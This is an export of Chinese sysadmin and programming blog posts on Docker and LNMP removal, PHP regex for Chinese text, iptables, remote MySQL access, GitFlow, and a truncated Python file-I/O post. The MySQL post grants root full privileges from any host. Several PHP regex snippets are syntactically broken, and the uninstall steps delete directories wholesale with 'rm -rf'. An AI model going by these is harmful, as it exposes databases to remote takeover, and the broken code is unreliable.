//会输出系统以及docker的一些基本信息<br>\n//或者运行hello-world，这个镜像会自行安装<br>\n$ sudo docker run hello-world<br>\n5.卸载</p>\n\n<p>卸载Docker CE<br>\n$ sudo yum remove docker-ce<br>\n删除主机上的图像，容器，卷或自定义配置文件不会自动删除。要删除所有图像，容器和卷：<br>\n$ sudo rm -rf /var/lib/docker<br>\n </p>\n                                    </div>", "log_PostTime": 1584891085, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "LNMP一键安装的卸载", "log_Intro": "LNMP一键安装的卸载", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>如果是lnmp一键安装的</p>\n\n<p>进入安装包目录</p>\n\n<p>[root@www home]# cd lnmp0.9-full</p>\n\n<p>[root@www lnmp0.9-full]# ls</p>\n\n<p>然后</p>\n\n<p>[root@www lnmp0.9-full]# ./uninstall.sh</p>\n\n<p>=========================================================================</p>\n\n<p>LNMPV0.8 for CentOS/RadHat Linux VPS  Written by Licess</p>\n\n<p>=========================================================================</p>\n\n<p>A tool to auto-compile &amp; install Nginx+MySQL+PHP on Linux</p>\n\n<p>For more information please visit http:/www.lnmp.org/</p>\n\n<p>Please backup your mysql data and configure files first!!!!!</p>\n\n<p>=========================================================================</p>\n\n<p>Please backup your mysql data!!!!!</p>\n\n<p>Press any key to start uninstall LNMP , please wait ……</p>\n\n<p>按任意键就可以进行卸载。</p>\n\n<p>=========================================================================</p>\n\n<p>如果是自己一步一步配置的LNMP环境那么</p>\n\n<p>killall nginx*//终止nginx进程</p>\n\n<p>/etc/init.d/mysql stop *//关闭mysql</p>\n\n<p>killall mysqld *//终止mysql进程</p>\n\n<p>/usr/local/php/sbin/php-fpm stop *//关闭php</p>\n\n<p>killall php-cgi *//终止php-cgi进程</p>\n\n<p>rm -rf /usr/local/php *//删除php文件</p>\n\n<p>rm -rf /usr/local/nginx *//删除nginx文件</p>\n\n<p>rm -rf /usr/local/mysql *//删除mysql文件</p>\n\n<p>rm -rf /usr/local/zend *//删除zend文件</p>\n\n<p>rm /etc/my.cnf *//删除配置文件</p>\n\n<p>rm /etc/init.d/mysql *//删除mysql文件</p>\n\n<p>rm /root/vhost.sh *//删除配置虚拟主机脚本</p>\n\n<p>rm /root/lnmp *//删除lnmp文件夹</p>\n                                    </div>", "log_PostTime": 1584891086, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "php 正则中文匹配", "log_Intro": "php 正则中文匹配", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>汉字一定注意是gbk还是utf8编码</strong></p>\n\n<p>UTF-8匹配:在javascript中，要判定字符串是中文是很简朴的。比如：var str = \"php编程\";if (/^[\\u4e00-\\u9fa5]+$/.test(str)) {alert(\"该字符串全部是中文\");} else{alert(\"该字符串不全部是中文\");}php中，是用 ...</p>\n\n<p>　　UTF-8匹配:</p>\n\n<p>　　在javascript中，要判定字符串是中文是很简朴的。比如：</p>\n\n<p>　　var str = \"php编程\";</p>\n\n<p>　　if (/^[\\u4e00-\\u9fa5]+$/.test(str)) {</p>\n\n<p>　　alert(\"该字符串全部是中文\");</p>\n\n<p>　　}</p>\n\n<p>　　else{</p>\n\n<p>　　alert(\"该字符串不全部是中文\");</p>\n\n<p>　　}</p>\n\n<p>　　php中，是用\\x表示十六进制数据的。于是，变换成如下的代码：</p>\n\n<p>　　$str = \"php编程\";</p>\n\n<p>　　if (preg_match(\"/^[\\x4e00-\\x9fa5]+$/\"$str)) {</p>\n\n<p>　　print(\"该字符串全部是中文\");</p>\n\n<p>　　} else {</p>\n\n<p>　　print(\"该字符串不全部是中文\");</p>\n\n<p>　　}</p>\n\n<p>　　貌似不报错了，判定的结果也准确，不过把$str换成“编程”两字，结果却还是显示“该字符串不全部是中文”，看来这样的判定还是不够准确。</p>\n\n<p>　　网上只能找到匹配全角字符的正则: ^[\\x80-\\xff]*^/</p>\n\n<p>　　[\\u4e00-\\u9fa5]可以匹配中文但是PHP又不支持</p>\n\n<p>　　可能还跟编码有关系，因此需要了解一下模式修正符的相关知识.</p>\n\n<p>　　在一篇《模式修正符》的文章中了解到：</p>\n\n<p>　　u (PCRE_UTF8)</p>\n\n<p>　　此修正符启用了一个 PCRE 中与 Perl 不兼容的额外功能。模式字符串被当成 UTF-8。本修正符在 Unix 下自 PHP 4.1.0 起可用，在 win32 下自 PHP 4.2.3 起可用。</p>\n\n<p>　　例子:</p>\n\n<p>　　preg_match('/[\\x{2460}-\\x{2468}]/u' $str); 匹配 内码汉字</p>\n\n<p>　　按照他提供的方式进行测试，代码如下：</p>\n\n<p>　　$str = \"php编程\";</p>\n\n<p>　　if (preg_match(\"/^[\\x{2460}-\\x{2468}]+$/u\"$str)) {</p>\n\n<p>　　print(\"该字符串全部是中文\");</p>\n\n<p>　　} else {</p>\n\n<p>　　print(\"该字符串不全部是中文\");</p>\n\n<p>　　}</p>\n\n<p>　　发现这次依然对是否为中文判定失常。</p>\n\n<p>　　不过，既然\\x表示的十六进制数据，为什么和js里边提供的范围\\x4e00-\\x9fa5不一样呢?于是我就换成了下边的代码发现真的准确了：</p>\n\n<p>　　$str = \"php编程\";</p>\n\n<p>　　if (preg_match(\"/^[\\x{4e00}-\\x{9fa5}]+$/u\"$str)) {</p>\n\n<p>　　print(\"该字符串全部是中文\");</p>\n\n<p>　　} else {</p>\n\n<p>　　print(\"该字符串不全部是中文\");</p>\n\n<p>　　}</p>\n\n<p>　　知道了php中utf-8编码下用正则表达式匹配汉字的最终准确表达式——/^[\\x{4e00}-\\x{9fa5}]+$/u，</p>\n\n<p>　　参考以上文章写了如下一段测试代码(复制以下代码保存成.php文件)</p>\n\n<p>　　输入字符(数字字母汉字下划线):</p>\n\n<p>　　GBK:</p>\n\n<p>　　preg_match(\"/^[\".chr(0xa1).\"-\".chr(0xff).\"A-Za-z0-9_]+$/\"$str); //GB2312汉字字母数字下划线正则表达式</p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n\n<p>本文章总结了php中利用正则表达式来匹配中文的一些实例函数，有需要的朋友可参考参考。</p>\n\n<p>我们先要明白<br>\n中文双字节字符编码范围</p>\n\n<p>1. GBK (GB2312/GB18030)<br>\nx00-xff GBK双字节编码范围<br>\nx20-x7f ASCII<br>\nxa1-xff 中文 gb2312<br>\nx80-xff 中文 gbk</p>\n\n<p>2. UTF-8 (Unicode)</p>\n\n<p>u4e00-u9fa5 (中文)<br>\nx3130-x318F (韩文<br>\nxAC00-xD7A3 (韩文)<br>\nu0800-u4e00 (日文)</p>\n\n<p>获取指定的中文与字符<br>\n例1</p>\n\n<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"><tbody><tr><td> 代码如下</td>\n\t\t\t<td>复制代码</td>\n\t\t</tr><tr><td colspan=\"2\" id=\"copy1168\" style=\"vertical-align:top;\">&lt;?php<br>\n\t\t\t$str = '正则如何匹配中文字在某中文字符串中？';<br>\n\t\t\tpreg_match(\"/中/\",$str,$regs);<br>\n\t\t\tprint_r($regs);<br>\n\t\t\t?&gt;</td>\n\t\t</tr></tbody></table><p>输出<br>\nArray<br>\n(<br>\n    [0] =&gt; 中<br>\n)</p>\n\n<p>例2</p>\n\n<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"><tbody><tr><td> 代码如下</td>\n\t\t\t<td>复制代码</td>\n\t\t</tr><tr><td colspan=\"2\" id=\"copy5170\" style=\"vertical-align:top;\">\n\t\t\t<p>&lt;?php<br>\n\t\t\t$str = '这里是中文 this is English';<br>\n\t\t\t//把中文变成红色<br>\n\t\t\techo preg_replace(\"/([x80-xff].)/\",\"&lt;font color=red&gt;1&lt;/font&gt;\",$str);<br>\n\t\t\t//把非中文变成红色<br>\n\t\t\techo preg_replace(\"/([x20-x7f])/\",\"&lt;font color=red&gt;1&lt;/font&gt;\",$str);<br>\n\t\t\t?&gt;</p>\n\n\t\t\t<p><br>\n\t\t\t </p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>签里面有中文、英文、数字等混排，则需要对汉字进行特殊处理，由于PCRE不支持U P L之类的perl字符串处理转义，使用16进制或者Unicode进行处理，范例如下：</p>\n\n<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"><tbody><tr><td> 代码如下</td>\n\t\t\t<td>复制代码</td>\n\t\t</tr><tr><td colspan=\"2\" id=\"copy5653\" style=\"vertical-align:top;\">\n\t\t\t<p><br>\n\t\t\t$str = \"之二宽阔的甘家口东#标签1#标签2 #标签3。#标签4,都发$1234 ￥xc,cvm , ￥12,dflksjf如何#标签5.x #tag6.cvxcv“\";<br>\n\t\t\tpreg_match_all('/#([a-zA-Z0-9x7f-xff]+)/', $str, $mat);<br>\n\t\t\tprint_r($mat);</p>\n\n\t\t\t<p>preg_match(\"/[x{00a5}x{ffe5}](d+)/u\", $str, $mat);<br>\n\t\t\tprint_r($mat);</p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><br>\n最后我明白了php中utf-8编码下用正则表达式匹配汉字的最终正确表达式——/^[x{4e00}-x{9fa5}]+$/u</p>\n\n<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"><tbody><tr><td> 代码如下</td>\n\t\t\t<td>复制代码</td>\n\t\t</tr><tr><td colspan=\"2\" id=\"copy1983\" style=\"vertical-align:top;\">\n\t\t\t<p>$str = \"php编程\";<br>\n\t\t\tif (preg_match(\"/^[x{4e00}-x{9fa5}]+$/u\",$str)) {<br>\n\t\t\tprint(\"该字符串全部是中文\");<br>\n\t\t\t} else {<br>\n\t\t\tprint(\"该字符串不全部是中文\");<br>\n\t\t\t}</p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><br>\n实例</p>\n\n<p>下面这款匹配中文字符串正则表达式是一款利用数组，然后 多次for把全是中文字符串的打印出来。<br>\n*/<br>\n </p>\n\n<table align=\"center\" border=\"0\" cellpadding=\"1\" cellspacing=\"1\"><tbody><tr><td> 代码如下</td>\n\t\t\t<td>复制代码</td>\n\t\t</tr><tr><td colspan=\"2\" id=\"copy1835\" style=\"vertical-align:top;\">\n\t\t\t<p>$str_arr = array(<br>\n\t\t\t\"iameverysorry\",<br>\n\t\t\t\"快乐编程，快乐生活\",<br>\n\t\t\t\"php教程编程\",<br>\n\t\t\t\"1997年香港回归\",<br>\n\t\t\t\"英语学习abc\",<br>\n\t\t\t\"www.php100.com\"<br>\n\t\t\t);</p>\n\n\t\t\t<p>$patt_ch = chr(0xa1) . \"-\" . chr(0xff);</p>\n\n\t\t\t<p>foreach ($str_arr as $str)<br>\n\t\t\t{<br>\n\t\t\t    echo \"字符串'$str' 是\";<br>\n\t\t\t    if (preg_match(\"/^[$patt_ch]+$/\", $str))<br>\n\t\t\t    {<br>\n\t\t\t        echo \"&lt;b&gt;完全中文&lt;/b&gt;\";<br>\n\t\t\t        echo \"&lt;br&gt;\";<br>\n\t\t\t        echo \"&lt;br&gt;\";<br>\n\t\t\t    }<br>\n\t\t\t    else<br>\n\t\t\t    {<br>\n\t\t\t        echo \"非完全中文\";<br>\n\t\t\t        echo \"&lt;br&gt;\";<br>\n\t\t\t        echo \"&lt;br&gt;\";<br>\n\t\t\t    }<br>\n\t\t\t}</p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>更多详细内容请查看：http://www.php100.com/phper/php-cy/34301.htm</p>\n                                    </div>", "log_PostTime": 1584891087, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "centos7下没有iptables进行安装或更新", "log_Intro": "centos7下没有iptables进行安装或更新", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>从centos7开始使用linux，之前版本的没有深入了解过，今天要开放个端口，需要有防火墙的相关操作，从网上查资料都是编辑/etc/sysconfig目录下面的iptables文件，可我进入这个文件之后，并没有发现这iptables文件，倒是有ip6tables-config和iptables-config这样的两个文件。</p>\n\n<p>经过查找资料，原来centos7下默认没有了iptables文件，如果有对防火墙的操作，需要更新或者重新安装防火墙服务。</p>\n\n<p>具体的解决办法：</p>\n\n<p>1.安装或者更新iptables-services</p>\n\n<p>yum install iptables-services;</p>\n\n<p>2.启动iptables</p>\n\n<p>systemctl enable iptables </p>\n\n<p>这个时候，/etc/sysconfig目录下面就有了iptables文件了。</p>\n\n<p>3.打开iptables</p>\n\n<p>systemctl start iptables </p>\n\n<p>4.编辑</p>\n\n<p>vim /etc/sysconfig/iptables</p>\n\n<p>5.重启防火墙</p>\n\n<p>service iptables restart</p>\n\n<p>centos7和之前的版本有的区别，以前没有注意到。<br>\n--------------------- <br>\n作者：suchcl <br>\n来源：CSDN <br>\n原文：https://blog.csdn.net/hbysj/article/details/80816926 <br>\n版权声明：本文为博主原创文章，转载请附上博文链接！</p>\n                                    </div>", "log_PostTime": 1584891088, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "MySQL开启远程连接权限", "log_Intro": "MySQL开启远程连接权限", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>1、登陆mysql数据库    </strong></p>\n\n<p>   mysql -u root -p</p>\n\n<p>   查看user表</p>\n\n<blockquote>\n<p>mysql&gt; use mysql;<br>\nDatabase changed<br>\nmysql&gt; select host,user,password from user;<br>\n+--------------+------+-------------------------------------------+<br>\n| host         | user | password                                  |<br>\n+--------------+------+-------------------------------------------+<br>\n| localhost    | root | *A731AEBFB621E354CD41BAF207D884A609E81F5E |<br>\n| 192.168.1.1 | root | *A731AEBFB621E354CD41BAF207D884A609E81F5E |<br>\n+--------------+------+-------------------------------------------+<br>\n2 rows in set (0.00 sec)</p>\n</blockquote>\n\n<p> </p>\n\n<p>   可以看到在user表中已创建的root用户。host字段表示登录的主机，其值可以用IP，也可用主机名，</p>\n\n<p>   (1)有时想用本地IP登录，那么可以将以上的Host值改为自己的Ip即可。</p>\n\n<p><strong>2、实现远程连接(授权法)</strong></p>\n\n<p>   将host字段的值改为%就表示在任何客户端机器上能以root用户登录到mysql服务器，建议在开发时设为%。   <br>\n   update user set host = ’%’ where user = ’root’;</p>\n\n<p>   将权限改为ALL PRIVILEGES</p>\n\n<blockquote>\n<p>mysql&gt; use mysql;<br>\nDatabase changed<br>\nmysql&gt; grant all privileges  on *.* to root@'%' identified by \"password\";<br>\nQuery OK, 0 rows affected (0.00 sec)</p>\n\n<p>mysql&gt; flush privileges;<br>\nQuery OK, 0 rows affected (0.00 sec)</p>\n\n<p>mysql&gt; select host,user,password from user;<br>\n+--------------+------+-------------------------------------------+<br>\n| host         | user | password                                  |<br>\n+--------------+------+-------------------------------------------+<br>\n| localhost    | root | *A731AEBFB621E354CD41BAF207D884A609E81F5E |<br>\n| 192.168.1.1 | root | *A731AEBFB621E354CD41BAF207D884A609E81F5E |<br>\n| %            | root | *A731AEBFB621E354CD41BAF207D884A609E81F5E |<br>\n+--------------+------+-------------------------------------------+<br>\n3 rows in set (0.00 sec)</p>\n</blockquote>\n\n<p>这样机器就可以以用户名root密码root远程访问该机器上的MySql.</p>\n\n<p><strong>3、实现远程连接（改表法）</strong></p>\n\n<p>use mysql;</p>\n\n<p>update user set host = '%' where user = 'root';</p>\n\n<p>这样在远端就可以通过root用户访问Mysql.</p>\n\n<p><strong>4、如果上面的方法不生效</strong></p>\n\n<p>可能就是对应的服务器限制的3306端口的访问导致的,下面以腾讯云为案例:</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190407231544191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p>只有增加开放3306端口才能连接成功!</p>\n                                    </div>", "log_PostTime": 1584891090, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Git基本命令和GitFlow工作流", "log_Intro": "Git基本命令和GitFlow工作流", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>本篇博客讲解了git的一些基本的团队协作命令，和GitFlow工作流指南</p>\n\n<h2 id=\"git-团队协作的一些命令\">git 团队协作的一些命令</h2>\n\n<ul><li><strong>1.开分支</strong></li>\n</ul><pre class=\"has\">\n<code>git branch 新分支名\n例如，在master分支下，新开一个开发分支：\ngit branch dev</code></pre>\n\n<ul><li><strong>2.切换到新分支</strong></li>\n</ul><pre class=\"has\">\n<code>git checkout 分支名\n例如，在master分支下，切换到新开的dev：\ngit checkout dev</code></pre>\n\n<ul><li><strong>3.开分支和切换分支合并到一个命令</strong></li>\n</ul><pre class=\"has\">\n<code>git checkout -b 新分支名\n例如，新开一个开发分支，并立即切换到该分支：\ngit checkout -b dev</code></pre>\n\n<ul><li><strong>4.切换回原分支</strong></li>\n</ul><pre class=\"has\">\n<code>git checkout 原分支名\n例如，切换回master\ngit checkout master\n注意：当前分支有修改，还未commit的时候，会切换失败，应当先commit，但可以不用push</code></pre>\n\n<ul><li><strong>5.合并分支</strong></li>\n</ul><pre class=\"has\">\n<code>git merge 需要合并的分支名\n例如，刚刚已经切换回master，现在需要合并dev的内容：\ngit merge dev\n建议在GitLab(或者其他git系统)上面创建merge request的形式来进行分支的合并和代码审核。</code></pre>\n\n<ul><li><strong>6.查看本地分支列表</strong></li>\n</ul><pre class=\"has\">\n<code>git branch -a\n前面带remotes/origin 的，是远程分支</code></pre>\n\n<ul><li><strong>7.查看远程分支列表</strong></li>\n</ul><pre class=\"has\">\n<code>git branch -r</code></pre>\n\n<ul><li><strong>8.向远程提交本地新开的分支</strong></li>\n</ul><pre class=\"has\">\n<code>git push origin 新分支名\n例如，刚刚在master下新开的dev分支：\ngit push origin dev</code></pre>\n\n<ul><li><strong>9.删除远程分支</strong></li>\n</ul><pre class=\"has\">\n<code>git push origin :远程分支名\n例如，删除刚刚提交到远程的dev分支：\ngit push origin :dev</code></pre>\n\n<ul><li><strong>10.删除本地分支</strong></li>\n</ul><pre class=\"has\">\n<code>git branch 分支名称 -d\n例如，在master分支下，删除新开的dev分支：\ngit branch dev -d\n注意：如果dev的更改，push到远程，在GitLab(或者其他git系统)上面进行了merge操作，但是本地master没有pull最新的代码，会删除不成功，可以先git pull origin master，或者强制删除\ngit branch dev -D</code></pre>\n\n<ul><li><strong>11.更新分支列表信息</strong></li>\n</ul><pre class=\"has\">\n<code>git fetch -p</code></pre>\n\n<ul><li>\n\t<p><strong>12.TortoiseGit(乌龟git)</strong></p>\n\n\t<pre class=\"has\">\n<code>  不可否认，在windows下，这个是个不错的工具。不管你是命令行新手还是重度使用者，我觉得都可以尝试一下。</code></pre>\n\t</li>\n</ul><h2 id=\"git工作流指南gitflow工作流\">Git工作流指南：Gitflow工作流</h2>\n\n<p>在你开始阅读之前，请记住：流程应被视作为指导方针，而非“铁律”。我们只是想告诉你可能的做法。因此，如果有必要的话，你可以组合使用不同的流程</p>\n\n<p><img alt=\"图一\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflows-gitflow.png\"></p>\n\n<p>Gitflow工作流定义了一个围绕项目发布的严格分支模型。虽然比功能分支工作流复杂几分，但提供了用于一个健壮的用于管理大型项目的框架。</p>\n\n<p>Gitflow工作流没有用超出功能分支工作流的概念和命令，而是为不同的分支分配一个很明确的角色，并定义分支之间如何和什么时候进行交互。除了使用功能分支，在做准备、维护和记录发布也使用各自的分支。当然你可以用上功能分支工作流所有的好处：Pull Requests、隔离实验性开发和更高效的协作。</p>\n\n<h3 id=\"工作方式\">工作方式</h3>\n\n<p>Gitflow工作流仍然用中央仓库作为所有开发者的交互中心。和其它的工作流一样，开发者在本地工作并push分支到要中央仓库中。</p>\n\n<h3 id=\"历史分支\">历史分支</h3>\n\n<p>相对使用仅有的一个master分支，Gitflow工作流使用2个分支来记录项目的历史。master分支存储了正式发布的历史，而develop分支作为功能的集成分支。这样也方便master分支上的所有提交分配一个版本号。</p>\n\n<p><img alt=\"图二\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-1historical.png\"></p>\n\n<p>剩下要说明的问题围绕着这2个分支的区别展开。</p>\n\n<h3 id=\"功能分支\">功能分支</h3>\n\n<p>每个新功能位于一个自己的分支，这样可以push到中央仓库以备份和协作。但功能分支不是从master分支上拉出新分支，而是使用develop分支作为父分支。当新功能完成时，合并回develop分支。新功能提交应该从不直接与master分支交互。</p>\n\n<p><img alt=\"图三\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-2feature.png\"></p>\n\n<blockquote>\n<p>注意，从各种含义和目的上来看，功能分支加上develop分支就是功能分支工作流的用法。但Gitflow工作流没有在这里止步。</p>\n</blockquote>\n\n<h3 id=\"发布分支\">发布分支</h3>\n\n<p><img alt=\"图四\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-3release.png\"></p>\n\n<p>一旦develop分支上有了做一次发布（或者说快到了既定的发布日）的足够功能，就从develop分支上fork一个发布分支。新建的分支用于开始发布循环，所以从这个时间点开始之后新的功能不能再加到这个分支上 —— 这个分支只应该做Bug修复、文档生成和其它面向发布任务。一旦对外发布的工作都完成了，发布分支合并到master分支并分配一个版本号打好Tag。另外，这些从新建发布分支以来的做的修改要合并回develop分支。</p>\n\n<p>使用一个用于发布准备的专门分支，使得一个团队可以在完善当前的发布版本的同时，另一个团队可以继续开发下个版本的功能。<br>\n这也打造定义良好的开发阶段（比如，可以很轻松地说，『这周我们要做准备发布版本4.0』，并且在仓库的目录结构中可以实际看到）。</p>\n\n<h3 id=\"常用的分支约定\">常用的分支约定：</h3>\n\n<blockquote>\n<p>用于新建发布分支的分支: develop</p>\n\n<p>用于合并的分支: master</p>\n\n<p>分支命名: release-* 或 release/*</p>\n</blockquote>\n\n<h3 id=\"维护分支\">维护分支</h3>\n\n<p><img alt=\"图五\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-4maintenance.png\"></p>\n\n<p>维护分支或说是热修复（hotfix）分支用于生成快速给产品发布版本（production releases）打补丁，这是唯一可以直接从master分支fork出来的分支。修复完成，修改应该马上合并回master分支和develop分支（当前的发布分支），master分支应该用新的版本号打好Tag。</p>\n\n<p>为Bug修复使用专门分支，让团队可以处理掉问题而不用打断其它工作或是等待下一个发布循环。你可以把维护分支想成是一个直接在master分支上处理的临时发布。</p>\n\n<h3 id=\"示例\">示例</h3>\n\n<p>下面的示例演示本工作流如何用于管理单个发布循环。假设你已经创建了一个中央仓库。</p>\n\n<p><em>创建开发分支</em></p>\n\n<p><img alt=\"图六\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-5createdev.png\"></p>\n\n<p>第一步为master分支配套一个develop分支。简单来做可以本地创建一个空的develop分支，push到服务器上：</p>\n\n<pre class=\"has\">\n<code>git branch develop\ngit push -u origin develop</code></pre>\n\n<p>以后这个分支将会包含了项目的全部历史，而master分支将只包含了部分历史。其它开发者这时应该克隆中央仓库，建好develop分支的跟踪分支：</p>\n\n<pre class=\"has\">\n<code>git clone ssh://user@host/path/to/repo.git\ngit checkout -b develop origin/develop</code></pre>\n\n<p>现在每个开发都有了这些历史分支的本地拷贝。</p>\n\n<p><em>工程师A和工程师B开始开发新功能</em></p>\n\n<p><img alt=\"图七\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-6maryjohnbeginnew.png\"></p>\n\n<p>这个示例中，工程师A和工程师B开始各自的功能开发。他们需要为各自的功能创建相应的分支。新分支不是基于master分支，而是应该基于develop分支：</p>\n\n<pre class=\"has\">\n<code>git checkout -b some-feature develop</code></pre>\n\n<p>他们用老套路添加提交到各自功能分支上：编辑、暂存、提交：</p>\n\n<pre class=\"has\">\n<code>git status\ngit add\ngit commit</code></pre>\n\n<p><em>工程师A完成功能开发</em></p>\n\n<p><img alt=\"图八\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-7maryfinishes.png\"></p>\n\n<p>添加了提交后，工程师A觉得她的功能OK了。如果团队使用Pull Requests，这时候可以发起一个用于合并到develop分支。否则她可以直接合并到她本地的develop分支后push到中央仓库：</p>\n\n<pre class=\"has\">\n<code>git pull origin develop\ngit checkout develop\ngit merge some-feature\ngit push\ngit branch -d some-feature</code></pre>\n\n<p>第一条命令在合并功能前确保develop分支是最新的。注意，功能决不应该直接合并到master分支。冲突解决方法和集中式工作流一样。</p>\n\n<p><em>工程师A开始准备发布</em></p>\n\n<p><img alt=\"图九\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-8maryprepsrelease.png\"></p>\n\n<p>这个时候工程师B正在实现他的功能，工程师A开始准备她的第一个项目正式发布。像功能开发一样，她用一个新的分支来做发布准备。这一步也确定了发布的版本号：</p>\n\n<pre class=\"has\">\n<code>git checkout -b release-0.1 develop</code></pre>\n\n<p>这个分支是清理发布、执行所有测试、更新文档和其它为下个发布做准备操作的地方，像是一个专门用于改善发布的功能分支。</p>\n\n<p>只要工程师A创建这个分支并push到中央仓库，这个发布就是功能冻结的。任何不在develop分支中的新功能都推到下个发布循环中。</p>\n\n<p><em>工程师A完成发布</em></p>\n\n<p><img alt=\"图十\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-release-cycle-9maryfinishes.png\"></p>\n\n<p>一旦准备好了对外发布，工程师A合并修改到master分支和develop分支上，删除发布分支。合并回develop分支很重要，因为在发布分支中已经提交的更新需要在后面的新功能中也要是可用的。另外，如果工程师A的团队要求Code Review，这是一个发起Pull Request的理想时机。</p>\n\n<pre class=\"has\">\n<code>git checkout master\ngit merge release-0.1\ngit push\ngit checkout develop\ngit merge release-0.1\ngit push\ngit branch -d release-0.1</code></pre>\n\n<p>发布分支是作为功能开发（develop分支）和对外发布（master分支）间的缓冲。只要有合并到master分支，就应该打好Tag以方便跟踪。</p>\n\n<pre class=\"has\">\n<code>git tag -a 0.1 -m \"Initial public release\" master\ngit push --tags</code></pre>\n\n<p>Git有提供各种勾子（hook），即仓库有事件发生时触发执行的脚本。可以配置一个勾子，在你push中央仓库的master分支时，自动构建好对外发布。</p>\n\n<p><em>最终用户发现Bug</em></p>\n\n<p><img alt=\"图十一\" class=\"has\" src=\"http://myqianlan.qiniudn.com/blog/2014/11/15/git-workflow-gitflow-enduserbug.png\"></p>\n\n<p>对外发布后，工程师A回去和工程师B一起做下个发布的新功能开发，直到有最终用户开了一个Ticket抱怨当前版本的一个Bug。为了处理Bug，工程师A（或工程师B）从master分支上拉出了一个维护分支，提交修改以解决问题，然后直接合并回master分支：</p>\n\n<pre class=\"has\">\n<code>git checkout -b issue-#001 master</code></pre>\n\n<p>Fix the bug</p>\n\n<pre class=\"has\">\n<code>git checkout master\ngit merge issue-#001\ngit push</code></pre>\n\n<p>就像发布分支，维护分支中新加这些重要修改需要包含到develop分支中，所以工程师A要执行一个合并操作。然后就可以安全地删除这个分支了：</p>\n\n<pre class=\"has\">\n<code>git checkout develop\ngit merge issue-#001\ngit push\ngit branch -d issue-#001</code></pre>\n\n<h2>总结:</h2>\n\n<p>第1步：初始化flow</p>\n\n<pre class=\"has\">\n<code>git flow init</code></pre>\n\n<p>第2步：在feature分支开发并完成</p>\n\n<pre class=\"has\">\n<code>git flow feature start feature_branch\ngit flow feature finish feature_branch\n</code></pre>\n\n<p>第3步：测试完成准备发布</p>\n\n<pre class=\"has\">\n<code>git flow release start 0.1.0\ngit flow release finish '0.1.0'\n</code></pre>\n\n<p>第4步：可能存在的紧急修复或者小需求调整</p>\n\n<pre class=\"has\">\n<code>git flow hotfix start hotfix_branch\ngit flow hotfix finish hotfix_branch\n</code></pre>\n\n<p> </p>\n\n<h2 id=\"最后\">最后</h2>\n\n<p>Git是一个不错的版本管理工具，但也仅仅是工具。记住，这里演示的工作流只是可能用法的例子，而不是在实际工作中使用Git不可违逆的条例。所以不要畏惧按自己需要对工作流的用法做取舍。不变的目标就是让Git为你所用。</p>\n\n<h2 id=\"参考资料\">参考资料</h2>\n\n<ol><li><strong>Comparing Workflows</strong> https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow/</li>\n\t<li><strong>Git 版本控制系統</strong> http://ihower.tw/git/index.html</li>\n</ol>                                    </div>", "log_PostTime": 1584891091, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "关于python文件读写小结", "log_Intro": "关于python文件读写小结", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><strong>读文件</strong></p>\n\n<p>打开一个文件用open()方法(open()返回一个文件对象，它是可迭代的)：</p>\n\n<pre>\n<code class=\"language-html hljs\">&gt;&gt;&gt; f = open('test.txt', 'r')</code></pre>\n\n<p>r表示是文本文件，rb是二进制文件。（这个mode参数默认值就是r）</p>\n\n<p>如果文件不存在，<code>open()</code>函数就会抛出一个<code>IOError</code>的错误，并且给出错误码和详细的信息告诉你文件不存在：</p>\n\n<pre>\n<code class=\"language-html hljs\">&gt;&gt;&gt; f=open('test.txt', 'r')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nFileNotFoundError: [Errno 2] No such file or directory: 'test.txt'</code></pre>\n\n<p>文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的</p>\n\n<pre>\n<code class=\"language-html hljs\">&gt;&gt;&gt; 